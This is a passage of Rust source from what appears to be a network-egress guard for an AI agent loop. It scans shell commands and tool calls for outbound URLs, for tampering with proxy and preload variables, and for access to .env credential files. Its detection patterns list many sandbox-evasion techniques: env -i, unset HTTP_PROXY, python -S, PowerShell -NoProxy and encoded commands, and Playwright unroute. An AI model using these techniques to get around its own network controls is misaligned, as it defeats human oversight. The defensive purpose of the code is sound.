    let mut found: Vec<String> = Vec::new();
    for m in URL_LITERAL_RE.find_all(text) {
        let url = m.text().trim_end_matches(['.', ',', ';', ':', '!', '?']).to_string();
        if !found.contains(&url) {
            found.push(url);
        }
    }
    found
}

fn exempt_literal(url: &str) -> bool {
    const NAMESPACE_HOSTS: [&str; 14] = [
        "www.w3.org",
        "w3.org",
        "schemas.microsoft.com",
        "schemas.xmlsoap.org",
        "xmlns.jcp.org",
        "java.sun.com",
        "maven.apache.org",
        "www.sitemaps.org",
        "ns.adobe.com",
        "purl.org",
        "json-schema.org",
        "json.schemastore.org",
        "www.schemastore.org",
        "www.opengis.net",
    ];
    match parse_request_url(url) {
        Ok((_, host, _, _)) => NAMESPACE_HOSTS.contains(&host.as_str()),
        Err(_) => false,
    }
}

fn literal_hits(ctx: &mut Ctx, text: &str, rule: &str, cred_forced: bool, place: &str, exempt: bool) {
    static TEMPLATE: LazyLock<Re> = LazyLock::new(|| Re::new(r"[${}<>%*]"));
    for url in url_literals(text) {
        let after = url.split_once("://").map(|(_, r)| r).unwrap_or("");
        let authority = AUTH_SPLIT.split(after).into_iter().next().unwrap_or_default();
        if TEMPLATE.is_match(rpartition(&authority, "@").2) {
            continue;
        }
        if exempt && exempt_literal(&url) {
            continue;
        }
        ctx.request(UNKNOWN_METHOD, &url, cred_forced || authority.contains('@'), rule, place);
    }
}

fn read_script(ctx: &mut Ctx, path: &str) -> Option<String> {
    let expanded = ctx.expand(path);
    let absolute = ctx.normalize(&expanded, Some(&ctx.cwd.clone()));
    if ctx.scanned.contains(&absolute) || !std::path::Path::new(&absolute).is_file() || VENDORED_RE.is_match(&absolute) {
        return None;
    }
    if !(ctx.inside(&absolute) || ctx.temp_folder(&absolute)) {
        return None;
    }
    ctx.scanned.insert(absolute.clone());
    let meta = std::fs::metadata(&absolute).ok()?;
    if meta.len() > MAX_FILE_BYTES {
        ctx.log.push(("info".into(), format!("script {} is over 1 MB: not scanned", last_segment(&absolute))));
        return None;
    }
    let data = std::fs::read(&absolute).ok()?;
    if data.iter().take(4096).any(|b| *b == 0) {
        return None;
    }
    Some(String::from_utf8_lossy(&data).into_owned())
}

// ---- tamper -------------------------------------------------------------------------------------------------------------------------

const PROXY_NAMES: [&str; 7] = ["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY", "FTP_PROXY", "NODE_USE_ENV_PROXY", "LOOP_NETWORK_ALLOW_FILE"];
const APPEND_NAMES: [&str; 2] = ["PYTHONPATH", "NODE_OPTIONS"];

fn protected_names() -> Vec<&'static str> {
    PROXY_NAMES.iter().chain(APPEND_NAMES.iter()).copied().collect()
}

fn names_alt() -> String {
    protected_names().join("|")
}

static ASSIGN_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(&format!(r"(?<![\w.\-])(?:\$\{{?env:|env:)?({})\}}?(\s*\+?=)(?!=)\s*([^\s;]*)", names_alt())));
static SET_ITEM_RE: LazyLock<Re> = LazyLock::new(|| {
    Re::ci(&format!(
        r"(?<![\w-])(?:Remove-Item|ri|rm|del|erase|rd|Set-Item|si|Clear-Item|cli|New-Item|ni|Set-Content|sc|Add-Content|ac|Rename-Item|rni|Copy-Item|cpi|Move-Item|mi|Set-ItemProperty|sp)\b[^\n;|]*?\bEnv:\\?\s*(?:{})\b",
        names_alt()
    ))
});
static SET_ENV_API_RE: LazyLock<Re> =
    LazyLock::new(|| Re::ci(&format!(r#"SetEnvironmentVariable\s*\(\s*['"](?:{n})['"]|(?<![\w-])setx\s+(?:/\w\s+)*['"]?(?:{n})\b"#, n = names_alt())));
static DEFAULT_PROXY_RE: LazyLock<Re> = LazyLock::new(|| {
    Re::ci(
        r"\[\s*(?:System\.)?Net\.WebRequest\s*\]\s*::\s*(?:DefaultWebProxy\s*=|set_DefaultWebProxy)|\[\s*(?:System\.)?Net\.Http\.HttpClient\s*\]\s*::\s*(?:DefaultProxy\s*=|set_DefaultProxy)|\[\s*(?:System\.)?Net\.WebRequest\s*\]\s*::\s*DefaultWebProxy\s*\.\s*\w+\s*=",
    )
});
static NO_PROXY_FLAG_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"(?<![\w-])-NoProxy\b|(?<![\w-])--no-?proxy\b"));
static BODY_ENV_RE: LazyLock<Re> =
    LazyLock::new(|| Re::ci(&format!(r"(?:environ|process\.env|putenv|unsetenv|setenv|Deno\.env)[^\n]{{0,100}}?(?<![\w])(?:{})(?![\w])", names_alt())));
static NODE_SKIP_RE: LazyLock<Re> = LazyLock::new(|| Re::new(r"^--no-experimental-\S+\z"));

fn tamper_text_hits(ctx: &mut Ctx, text: &str, in_body: bool) {
    for m in ASSIGN_RE.find_all(text) {
        let name = m.group(1).unwrap_or("").to_uppercase();
        let op = m.group(2).unwrap_or("").trim().to_string();
        let value = m.group(3).unwrap_or("").trim_matches(|c| c == '"' || c == '\'').to_string();
        if APPEND_NAMES.contains(&name.as_str()) {
            let own = Re::ci(&format!(r"^(?:\$\{{?(?:env:)?{n}\}}?|%{n}%)", n = name));
            if op == "+=" || own.match_start(&value).is_some() {
                continue;
            }
        }
        ctx.hit("egress-tamper", &format!("setting {name} would switch the loop's run-time egress layer off; the loop sets it, never the command"));
    }
    let checks: [(&Re, &str); 4] = [
        (&SET_ITEM_RE, "changing an Env: variable of the run-time egress layer"),
        (&SET_ENV_API_RE, "SetEnvironmentVariable/setx on a variable of the run-time egress layer"),
        (&DEFAULT_PROXY_RE, "assigning a .NET default proxy replaces the loop's egress proxy"),
        (&NO_PROXY_FLAG_RE, "-NoProxy/--noproxy skips the loop's egress proxy"),
    ];
    for (pattern, why) in checks {
        if pattern.is_match(text) {
            ctx.hit("egress-tamper", why);
        }
    }
    if in_body && BODY_ENV_RE.is_match(text) {
        ctx.hit("egress-tamper", "inline code that touches a proxy or preload variable of the run-time egress layer");
    }
}

fn tamper_word_hits(ctx: &mut Ctx, name: &str, args: &[String]) {
    let upper: Vec<String> = args.iter().map(|a| a.to_uppercase()).collect();
    let prot = protected_names();
    if name == "unset" && upper.iter().any(|a| prot.contains(&a.as_str())) {
        ctx.hit("egress-tamper", "unset of a variable of the run-time egress layer");
    } else if name == "export" && args.iter().any(|a| a == "-n") && upper.iter().any(|a| prot.contains(&a.as_str())) {
        ctx.hit("egress-tamper", "export -n of a variable of the run-time egress layer");
    } else if name == "env" {
        static CLUSTER_I: LazyLock<Re> = LazyLock::new(|| Re::new(r"^-[A-Za-z]*i[A-Za-z]*\z"));
        let mut index = 0;
        while index < args.len() && (args[index].starts_with('-') || args[index].contains('=')) {
            let option = args[index].clone();
            index += 1;
            let mut value: Option<String> = None;
            if option == "-i" || option == "-" || option == "--ignore-environment" || CLUSTER_I.is_match(&option) {
                ctx.hit("egress-tamper", "env -i clears the environment, proxy variables and preloads included");
            } else if option == "-u" || option == "--unset" {
                value = Some(args.get(index).cloned().unwrap_or_default());
                index += 1;
            } else if option.starts_with("--unset=") {
                value = Some(partition(&option, "=").2.to_string());
            } else if option.starts_with("-u") && option.chars().count() > 2 {
                value = Some(option[2..].to_string());
            }
            if let Some(v) = value {
                if prot.contains(&v.to_uppercase().as_str()) {
                    ctx.hit("egress-tamper", "env -u of a variable of the run-time egress layer");
                }
            }
        }
    }
}

// ---- interpreters --------------------------------------------------------------------------------------------------------------------

static PYTHON_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:py|pythonw?|python\d[\d.]*|pypy\d*)\z"));
static NODE_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:node|nodejs)\z"));
static TS_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:tsx|ts-node|ts-node-esm|bun|deno)\z"));
static SHELL_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:bash|sh|zsh|dash|ksh)\z"));
static POWERSHELL_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:pwsh|powershell)\z"));
const EXTRA_LAUNCHERS: [&str; 10] = ["npx", "bunx", "pnpm", "yarn", "npm", "uvx", "uv", "pipx", "poetry", "pdm"];
static PS_COMMAND_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^-c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?\z"));
static PS_ENCODED_RE: LazyLock<Re> =
    LazyLock::new(|| Re::ci(r"^-e(?:c|nc|nco|ncod|ncode|ncoded|ncodedc|ncodedco|ncodedcom|ncodedcomm|ncodedcomma|ncodedcomman|ncodedcommand)?\z"));
static PS_FILE_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^-f(?:i(?:l(?:e)?)?)?\z"));

fn program_starts(words: &[String]) -> Vec<usize> {
    let mut starts = command_starts(words);
    let mut index = 0;
    while index < words.len() && ASSIGNMENT.is_match(&words[index]) {
        index += 1;
    }
    if index < words.len() && EXTRA_LAUNCHERS.contains(&executable_name(&words[index]).as_str()) {
        for position in index + 1..words.len() {
            if !starts.contains(&position) {
                starts.push(position);
            }
        }
    }
    starts
}

/// `(bodies, stdin, files)` of a python command line; flags that skip the preloads are hits.
fn python_parts(ctx: &mut Ctx, args: &[String]) -> (Vec<String>, bool, Vec<String>) {
    let mut bodies = Vec::new();
    let mut files = Vec::new();
    let mut stdin = false;
    let mut index = 0;
    while index < args.len() {
        let word = &args[index];
        index += 1;
        if word == "-W" || word == "-X" || word == "-Q" {
            index += 1;
        } else if word == "-" {
            stdin = true;
            break;
        } else if word.starts_with('-') && !word.starts_with("--") {
            let letters: Vec<char> = word.chars().skip(1).collect();
            for (position, letter) in letters.iter().enumerate() {
                if "SEI".contains(*letter) {
                    ctx.hit("egress-tamper", &format!("python -{letter} skips site/sitecustomize or the PYTHON* variables the loop's egress preload depends on"));
                }
                if *letter == 'c' {
                    let tail: String = letters[position + 1..].iter().collect();
                    let body = if !tail.is_empty() { tail } else { args.get(index).cloned().unwrap_or_default() };
                    bodies.push(body);
                    return (bodies, stdin, files);
                }
                if "WXQm".contains(*letter) {
                    break;
                }
            }
            if word.ends_with('m') && index < args.len() {
                return (bodies, stdin, files);
            }
        } else if !word.starts_with('-') {
            files.push(word.clone());
            break;
        }
    }
    (bodies, stdin || args.is_empty(), files)
}

fn node_parts(ctx: &mut Ctx, args: &[String]) -> (Vec<String>, bool) {
    let mut bodies = Vec::new();
    let mut stdin = false;
    let mut index = 0;
    while index < args.len() {
        let word = &args[index];
        index += 1;
        if NODE_SKIP_RE.is_match(word) {
            ctx.hit("egress-tamper", &format!("node {word} changes how the preloaded egress filter is loaded"));
        }
        if ["-e", "--eval", "-p", "--print", "-pe", "-ep"].contains(&word.as_str()) && index < args.len() {
            bodies.push(args[index].clone());
            index += 1;
        } else if let Some(rest) = word.strip_prefix("--eval=") {
            bodies.push(rest.to_string());
        } else if word == "-" {
            stdin = true;
        }
    }
    (bodies, stdin || args.is_empty())
}

fn powershell_parts(ctx: &mut Ctx, args: &[String]) -> (Vec<String>, bool, Vec<String>) {
    let mut bodies = Vec::new();
    let mut files = Vec::new();
    let mut stdin = false;
    let mut index = 0;
    while index < args.len() {
        let word = &args[index];
        index += 1;
        if PS_COMMAND_RE.is_match(word) {
            let rest = &args[index..];
            if rest.len() == 1 && rest[0] == "-" {
                stdin = true;
            } else {
                bodies.push(rest.join(" "));
            }
            break;
        }
        if PS_ENCODED_RE.is_match(word) && index < args.len() {
            let decoded = base64::engine::general_purpose::STANDARD.decode(args[index].as_bytes()).ok().and_then(|bytes| {
                if bytes.len() % 2 != 0 {
                    return None;
                }
                let units: Vec<u16> = bytes.chunks(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
                String::from_utf16(&units).ok()
            });
            match decoded {
                Some(text) => bodies.push(text),
                None => ctx.unprovable("powershell -EncodedCommand", "the encoded command cannot be decoded, so what it reaches cannot be proven"),
            }
            break;
        }
        if PS_FILE_RE.is_match(word) && index < args.len() {
            files.push(args[index].clone());
            break;
        }
        if word == "-" {
            stdin = true;
        }
    }
    (bodies, stdin || args.is_empty(), files)
}

fn scan_files(ctx: &mut Ctx, candidates: &[String], raw: &str, cred_forced: bool) {
    static WRITER: LazyLock<Re> = LazyLock::new(|| Re::new(r"<<|>|\btee\b|Set-Content|Out-File"));
    for word in candidates {
        if !SCRIPT_EXT_RE.is_match(word) || word.starts_with('-') || last_segment(word).to_lowercase() == "testenv.py" {
            continue;
        }
        match read_script(ctx, word) {
            Some(text) => {
                literal_hits(ctx, &text, "egress-host", cred_forced, &format!("script {}", last_segment(word)), true);
            }
            None => {
                let expanded = ctx.expand(word);
                let absolute = ctx.normalize(&expanded, Some(&ctx.cwd.clone()));
                if !std::path::Path::new(&absolute).is_file() && WRITER.is_match(raw) {
                    literal_hits(ctx, raw, "egress-host", cred_forced, &format!("command text (script {} not found)", last_segment(word)), true);
                }
            }
        }
    }
}

fn interpreter(ctx: &mut Ctx, name: &str, args: &[String], raw: &str, cred_forced: bool) {
    let mut bodies: Vec<String> = Vec::new();
    let mut stdin = false;
    let mut files: Vec<String> = args.to_vec();
    if PYTHON_RE.is_match(name) {
        let (b, s, f) = python_parts(ctx, args);
        bodies = b;
        stdin = s;
        files = if f.is_empty() { args.iter().filter(|w| SCRIPT_EXT_RE.is_match(w)).cloned().collect() } else { f };
    } else if NODE_RE.is_match(name) {
        let (b, s) = node_parts(ctx, args);
        bodies = b;
        stdin = s;
    } else if name == "deno" && args.first().is_some_and(|a| a == "eval") {
        bodies = args[1..].iter().filter(|w| !w.starts_with('-')).cloned().collect();
    } else if POWERSHELL_RE.is_match(name) {
        let (b, s, f) = powershell_parts(ctx, args);
        bodies = b;
        stdin = s;
        files = if f.is_empty() { args.iter().filter(|w| SCRIPT_EXT_RE.is_match(w)).cloned().collect() } else { f };
    }
    for body in &bodies {
        literal_hits(ctx, body, "egress-host", cred_forced, "inline code", true);
        tamper_text_hits(ctx, body, true);
    }
    if stdin && (PYTHON_RE.is_match(name) || NODE_RE.is_match(name) || POWERSHELL_RE.is_match(name)) {
        literal_hits(ctx, raw, "egress-host", cred_forced, "script from stdin", true);
        tamper_text_hits(ctx, raw, true);
    }
    scan_files(ctx, &files, raw, cred_forced);
    for word in args {
        if SCHEME_PREFIX.match_start(word).is_some() {
            let scheme = word.split("://").next().unwrap_or("").to_lowercase();
            if ["http", "https", "ws", "wss"].contains(&scheme.as_str()) {
                literal_hits(ctx, word, "egress-host", cred_forced, "argument", false);
            }
        }
    }
}

// ---- testenv, playwright --------------------------------------------------------------------------------------------------------------

fn testenv_inner(words: &[String]) -> Option<String> {
    for (position, word) in words.iter().enumerate() {
        let tail = word.trim_matches(|c| c == '"' || c == '\'').rsplit(['\\', '/']).next().unwrap_or("").to_lowercase();
        if tail != "testenv.py" && tail != "testenv" && tail != "craft" && tail != "craft.exe" {
            continue;
        }
        let mut index = position + 1;
        if tail.starts_with("craft") {
            // the toolkit binary: `craft testenv [--project X] exec <inner...>`
            if words.get(index).map(String::as_str) != Some("testenv") {
                continue;
            }
            index += 1;
        }
        while index < words.len() && words[index].starts_with('-') {
            index += if words[index] == "--project" || words[index] == "--names" { 2 } else { 1 };
        }
        if index < words.len() && words[index] == "exec" {
            return Some(if words.len() > index + 2 { join_words(&words[index + 1..]) } else { words.get(index + 1).cloned().unwrap_or_default() });
        }
    }
    None
}

fn uses_secret(inner: &str) -> bool {
    VARIABLE_RE.find_all(inner).into_iter().map(|m| (1..=4).find_map(|i| m.group(i)).unwrap_or("").to_string()).any(|n| SECRET_NAME.is_match(&n))
}

const FILTER_RELATIVE: &str = ".specs/project/loop/internal/network-filter.js";
static ROUTE_CODE_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r#"unroute|\.\s*route\s*[(\[]|routeFromHAR|routeWebSocket|\[\s*['"`]\s*(?:un)?route"#));

fn playwright(ctx: &mut Ctx, args: &[String], cred_forced: bool) {
    let lowered: Vec<String> = args.iter().map(|a| a.to_lowercase()).collect();
    if lowered.iter().any(|a| a == "route" || a == "route-remove" || a == "route-list" || a.starts_with("unroute")) {
        ctx.hit("egress-tamper", "playwright-cli route/unroute/route-remove would change the loop's network filter");
        return;
    }
    if let Some(pos) = lowered.iter().position(|a| a == "run-code") {
        let mut codes: Vec<String> = Vec::new();
        let mut filename: Option<String> = None;
        let mut index = pos + 1;
        while index < args.len() {
            let word = &args[index];
            index += 1;
            if let Some(rest) = word.strip_prefix("--filename=") {
                filename = Some(rest.to_string());
            } else if word == "--filename" && index < args.len() {
                filename = Some(args[index].clone());
                index += 1;
            } else if !word.starts_with('-') {
                codes.push(word.clone());
            }
        }
        if let Some(file) = filename {
            let expanded = ctx.expand(&file);
            let absolute = ctx.normalize(&expanded, Some(&ctx.cwd.clone()));
            let roots = ctx.roots.clone();
            if roots.iter().any(|root| absolute == format!("{root}/{}", FILTER_RELATIVE.to_lowercase()) || absolute == format!("{root}/{FILTER_RELATIVE}")) {
                return;
            }
            match read_script(ctx, &file) {
                None => {
                    ctx.hit(
                        "egress-tamper",
                        &format!("playwright-cli run-code --filename {} cannot be read, so it cannot be proven not to change the network filter", last_segment(&file)),
                    );
                    return;
                }
                Some(text) => codes.push(text),
            }
        }
        for code in &codes {
            if ROUTE_CODE_RE.is_match(code) {
                ctx.hit("egress-tamper", "playwright-cli run-code that unroutes or installs a route would change the loop's network filter");
            }
            literal_hits(ctx, code, "egress-host", cred_forced, "run-code", true);
        }
        return;
    }
    for (position, word) in lowered.iter().enumerate() {
        if ["open", "goto", "tab-new"].contains(&word.as_str()) {
            for target in &args[position + 1..] {
                let target = if target.to_lowercase().starts_with("--url=") { partition(target, "=").2.to_string() } else { target.clone() };
                static HOSTISH: LazyLock<Re> = LazyLock::new(|| Re::new(r"[.:$%]|^localhost"));
                if target.starts_with('-') || !HOSTISH.is_match(&target) {
                    continue;
                }
                let (url, cred, why) = resolve_target(ctx, &target);
                if !why.is_empty() {
                    let shown: String = target.chars().take(60).collect();
                    ctx.unprovable(&format!("playwright-cli {word} {shown}"), &why);
                } else if let Some(url) = url.filter(|u| !u.is_empty()) {
                    ctx.request("GET", &url, cred || cred_forced, "egress-host", "");
                }
            }
            return;
        }
    }
}

// ---- the command -----------------------------------------------------------------------------------------------------------------------

fn scan_words(ctx: &mut Ctx, words: &[String], raw: &str, cred_forced: bool, depth: usize) {
    if let Some(inner) = testenv_inner(words) {
        if !inner.is_empty() && depth < MAX_DEPTH {
            let forced = cred_forced || uses_secret(&inner);
            scan_command(ctx, &inner, forced, depth + 1);
        }
    }
    for start in program_starts(words) {
        let name = executable_name(&words[start]);
        let args: Vec<String> = words[start + 1..].to_vec();
        tamper_word_hits(ctx, &name, &args);
        if http_family(&name).is_some() {
            http_tool(ctx, &name, &args, cred_forced);
        } else if socket_default_port(&name).is_some() || is_net_url_tool(&name) {
            net_tool(ctx, &name, &args, raw);
        } else if name == "playwright-cli" {
            playwright(ctx, &args, cred_forced);
        } else if name == "source" || name == "." {
            let first: Vec<String> = args.iter().take(1).cloned().collect();
            scan_files(ctx, &first, raw, cred_forced);
        } else if PYTHON_RE.is_match(&name) || NODE_RE.is_match(&name) || TS_RE.is_match(&name) || POWERSHELL_RE.is_match(&name) || SHELL_RE.is_match(&name) {
            interpreter(ctx, &name, &args, raw, cred_forced);
        } else if SCRIPT_EXT_RE.is_match(&words[start]) {
            scan_files(ctx, &[words[start].clone()], raw, cred_forced);
        }
    }
}

fn is_printer(name: &str) -> bool {
    matches!(name, "echo" | "printf" | "write-output" | "write-host" | "grep" | "egrep" | "fgrep" | "rg" | "ag" | "ack" | "select-string" | "sls" | "findstr")
}

/// Index after the balanced open ... close group that starts at `index`.
fn group_end(events: &[Event], mut index: usize) -> usize {
    let mut depth: i32 = 0;
    while index < events.len() {
        depth += match events[index] {
            Event::Open => 1,
            Event::Close => -1,
            Event::Cmd(_) => 0,
        };
        index += 1;
        if depth == 0 {
            break;
        }
    }
    index
}

/// Every command of the text. The quoted text an `echo`/`grep`... receives is only text, not a command, unless it holds a sub-shell.
pub fn scan_command(ctx: &mut Ctx, command: &str, cred_forced: bool, depth: usize) {
    for mut events in shell_event_variants(command) {
        let mut index = 0;
        while index < events.len() {
            let event = events[index].clone();
            index += 1;
            let Event::Cmd(words) = event else { continue };
            if words.is_empty() {
                continue;
            }
            scan_words(ctx, &words, command, cred_forced, depth);
            let first = words.iter().find(|w| !ASSIGNMENT.is_match(w)).cloned().unwrap_or_default();
            if !is_printer(&executable_name(&first)) {
                continue;
            }
            for word in words.iter().filter(|w| w.trim().chars().any(char::is_whitespace)) {
                if index < events.len() && events[index] == Event::Open {
                    let end = group_end(&events, index);
                    if !word.contains("$(") && !word.contains('`') {
                        events.drain(index..end);
                    }
                } else {
                    break;
                }
            }
        }
    }
}

/// `[(rule, reason)]` of one Bash/PowerShell command for the network rules in `rules`.
pub fn command_hits(ctx: &mut Ctx, command: &str, rules: &[&str]) -> Vec<(String, String)> {
    if command.is_empty() {
        return vec![];
    }
    ctx.hits.clear();
    scan_command(ctx, command, false, 0);
    if rules.contains(&"env-file") {
        env_text_hits(ctx, command);
    }
    tamper_text_hits(ctx, command, false);
    ctx.hits.iter().filter(|(rule, _)| rules.contains(&rule.as_str())).cloned().collect()
}

// ---- .env files ------------------------------------------------------------------------------------------------------------------------

static ENV_FILE_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^\.env(?:\.[\w*?\[\]{}-]+)*[*?]?\n?\z"));
static TOKEN_SPLIT_RE: LazyLock<Re> = LazyLock::new(|| Re::new(r#"[\s"'`<>|;&(){},=]+"#));
static VAR_CHARS: LazyLock<Re> = LazyLock::new(|| Re::new(r"[$%`]|\$\("));
const PROJECT_ENV_TEST: &str = ".specs/project/.env.test";

fn is_env_name(name: &str) -> bool {
    ENV_FILE_RE.is_match(name) && !["example", "sample", "template"].contains(&name.to_lowercase().rsplit('.').next().unwrap_or(""))
}

fn env_token_reason(ctx: &mut Ctx, token: &str, base: Option<&str>) -> String {
    let token = token.replace('\\', "/");
    if !is_env_name(token.rsplit('/').next().unwrap_or("")) {
        return String::new();
    }
    let expanded = ctx.expand(&token);
    let shown: String = token.chars().take(80).collect();
    if VAR_CHARS.is_match(&expanded) {
        return format!("{shown} is built from a variable, so the guard cannot tell whether the .env file is inside the project");
    }
    let base = base.map(String::from).unwrap_or_else(|| ctx.cwd.clone());
    let absolute = ctx.normalize(&expanded, Some(&base));
    if !ctx.inside(&absolute) {
        return format!(".env file outside the project ({shown}): in the loop only .env files inside the project root may be read or written");
    }
    if absolute.ends_with(&format!("/{PROJECT_ENV_TEST}")) {
        return format!("{PROJECT_ENV_TEST} holds the test credentials: their values reach commands only through testenv.py exec");
    }
    String::new()
}

fn env_text_hits(ctx: &mut Ctx, text: &str) {
    for token in TOKEN_SPLIT_RE.split(text) {
        if !token.is_empty() && token.to_lowercase().contains(".env") {
            let reason = env_token_reason(ctx, &token, None);
            if !reason.is_empty() {
                ctx.hit("env-file", &reason);
            }
        }
    }
}

// ---- tools -------------------------------------------------------------------------------------------------------------------------------

const WRITE_TOOLS: [&str; 4] = ["Write", "Edit", "MultiEdit", "NotebookEdit"];

fn new_texts(tool_name: &str, input: &Value) -> Vec<Option<String>> {
    let s = |key: &str| input.get(key).and_then(Value::as_str).map(String::from);
    match tool_name {
        "Write" => vec![s("content")],
        "Edit" => vec![s("new_string")],
        "MultiEdit" => input
            .get("edits")
            .and_then(Value::as_array)
            .map(|edits| edits.iter().filter(|e| e.is_object()).map(|e| e.get("new_string").and_then(Value::as_str).map(String::from)).collect())
            .unwrap_or_default(),
        _ => vec![s("new_source")],
    }
}

fn content_hits(ctx: &mut Ctx, tool_name: &str, input: &Value) {
    let target = input
        .get("file_path")
        .and_then(Value::as_str)
        .filter(|s| !s.is_empty())
        .or_else(|| input.get("notebook_path").and_then(Value::as_str).filter(|s| !s.is_empty()))
        .unwrap_or("")
        .to_string();
    if target.is_empty() {
        return;
    }
    let expanded = ctx.expand(&target);
    let absolute = ctx.normalize(&expanded, Some(&ctx.cwd.clone()));
    if !(ctx.inside(&absolute) || ctx.temp_folder(&absolute)) || format!("{absolute}/").contains("/.specs/") || SKIP_CONTENT_RE.is_match(&absolute) {
        return;
    }
    let name = last_segment(&absolute).to_string();
    for text in new_texts(tool_name, input).into_iter().flatten() {
        if text.is_empty() {
            continue;
        }
        if text.len() as u64 > MAX_FILE_BYTES {
            ctx.log.push(("info".into(), format!("content for {name} is over 1 MB: not scanned")));
            continue;
        }
        if ENV_FILE_RE.is_match(&name) {
            for m in ASSIGN_RE.find_all(&text) {
                let n = m.group(1).unwrap_or("").to_uppercase();
                if !PROXY_NAMES.contains(&n.as_str()) {
                    continue;
                }
                ctx.hit("egress-tamper", &format!("an .env file must not set {n}: it would switch the loop's run-time egress layer off"));
            }
        }
        literal_hits(ctx, &text, "egress-content", false, &format!("content for {name}"), true);
    }
}

/// `[(rule, reason)]` of a non-shell tool call for the network rules in `rules`.
pub fn tool_hits(ctx: &mut Ctx, tool_name: &str, input: &Value, rules: &[&str]) -> Vec<(String, String)> {
    if !input.is_object() {
        return vec![];
    }
    ctx.hits.clear();
    if tool_name == "WebFetch" && rules.contains(&"egress-host") {
        if let Some(url) = input.get("url").and_then(Value::as_str) {
            let (resolved, cred, why) = resolve_target(ctx, url);
            if !why.is_empty() {
                ctx.unprovable("WebFetch", &why);
            } else if let Some(u) = resolved.filter(|u| !u.is_empty()) {
                ctx.request("GET", &u, cred, "egress-host", "");
            }
        }
    }
    if WRITE_TOOLS.contains(&tool_name) && rules.contains(&"egress-content") {
        content_hits(ctx, tool_name, input);
    }
    if rules.contains(&"env-file") && (["Read", "Glob", "Grep"].contains(&tool_name) || WRITE_TOOLS.contains(&tool_name)) {
        let base = input.get("path").and_then(Value::as_str).map(String::from);
        for key in ["file_path", "notebook_path", "path"] {
            if let Some(value) = input.get(key).and_then(Value::as_str).filter(|v| !v.is_empty()) {
                let reason = env_token_reason(ctx, value, None);
                if !reason.is_empty() {
                    ctx.hit("env-file", &reason);
                }
            }
        }
        for key in ["glob", "pattern"] {
            let Some(value) = input.get(key).and_then(Value::as_str) else {
                continue;
            };
            if (tool_name == "Glob" || tool_name == "Grep") && (key == "glob" || tool_name == "Glob") && value.to_lowercase().contains(".env") {
                static ABS: LazyLock<Re> = LazyLock::new(|| Re::new(r"^(?:[a-zA-Z]:)?/"));
                let folder = match &base {
                    Some(b) if !b.is_empty() => {
                        let expanded = ctx.expand(b);
                        ctx.normalize(&expanded, Some(&ctx.cwd.clone()))
                    }
                    _ => {
                        let c = if ctx.cwd.is_empty() { ctx.root.clone() } else { ctx.cwd.clone() };
                        ctx.normalize(&c, None)
                    }
                };
                let reason = if ABS.is_match(&value.replace('\\', "/")) {
                    env_token_reason(ctx, value, None)
                } else if !ctx.inside(&folder) {
                    let shown: String = base.clone().unwrap_or_else(|| folder.clone()).chars().take(80).collect();
                    format!(".env search outside the project ({shown}): in the loop only .env files inside the project root may be read")
                } else {
                    String::new()
                };
                if !reason.is_empty() {
                    ctx.hit("env-file", &reason);
                }
            }
        }
    }
    ctx.hits.iter().filter(|(rule, _)| rules.contains(&rule.as_str())).cloned().collect()
}

// ---- run-time layer: the variables of the agent's commands ---------------------------------------------------------------------

const CLOSED_PROXY_PORT: u32 = 9;
const NO_PROXY_VALUE: &str = "localhost,127.0.0.1,::1,.localhost";

#[derive(Debug, Clone)]
pub struct RuntimeSettings {
    pub port: u32,
    pub degraded: bool,
    pub allow_file: String,
    pub preload_dir: String,
    pub node_preload: String,
}

fn slashes(path: &str) -> String {
    crate::pyre::nt_abspath(path).replace('\\', "/")
}

/// What the prefix needs, from `<specs>/project/loop/internal/`; `None` when there is neither a runtime file nor an allow file.
pub fn runtime_settings(specs_dir: &str, app_home: &str) -> Option<RuntimeSettings> {
    let internal = std::path::Path::new(specs_dir).join("project").join("loop").join("internal");
    let info = std::fs::read(internal.join("network-runtime.json"))
        .ok()
        .and_then(|b| String::from_utf8(b).ok())
        .and_then(|t| serde_json::from_str::<Value>(t.strip_prefix('\u{feff}').unwrap_or(&t)).ok())
        .filter(Value::is_object)
        .unwrap_or(Value::Object(Default::default()));
    let port = info.get("port").and_then(Value::as_i64).filter(|p| *p > 0 && *p < 65536).map(|p| p as u32);
    let mut allow_file = internal.join("network-allow.json").display().to_string();
    if !std::path::Path::new(&allow_file).is_file() {
        allow_file = info.get("allow_file").and_then(Value::as_str).filter(|p| std::path::Path::new(p).is_file()).unwrap_or("").to_string();
    }
    if port.is_none() && allow_file.is_empty() {
        return None;
    }
    let mut preload_dir = info.get("preload_dir").and_then(Value::as_str).unwrap_or("").to_string();
    if !(!preload_dir.is_empty() && std::path::Path::new(&preload_dir).is_dir()) && !app_home.is_empty() {
        preload_dir = std::path::Path::new(app_home).join("backend").join("harness_backend").join("engine").join("net_preload").display().to_string();
    }
    let mut node_preload = info.get("node_preload").and_then(Value::as_str).unwrap_or("").to_string();
    if !(!node_preload.is_empty() && std::path::Path::new(&node_preload).is_file()) {
        node_preload = if preload_dir.is_empty() { String::new() } else { std::path::Path::new(&preload_dir).join("preload.cjs").display().to_string() };
    }
    Some(RuntimeSettings {
        port: port.unwrap_or(CLOSED_PROXY_PORT),
        degraded: port.is_none(),
        allow_file: if allow_file.is_empty() { String::new() } else { slashes(&allow_file) },
        preload_dir: if !preload_dir.is_empty() && std::path::Path::new(&preload_dir).is_dir() { slashes(&preload_dir) } else { String::new() },
        node_preload: if !node_preload.is_empty() && std::path::Path::new(&node_preload).is_file() { slashes(&node_preload) } else { String::new() },
    })
}

fn sh_quote(text: &str) -> String {
    format!("'{}'", text.replace('\'', "'\\''"))
}

fn ps_quote(text: &str) -> String {
    format!("'{}'", text.replace('\'', "''"))
}

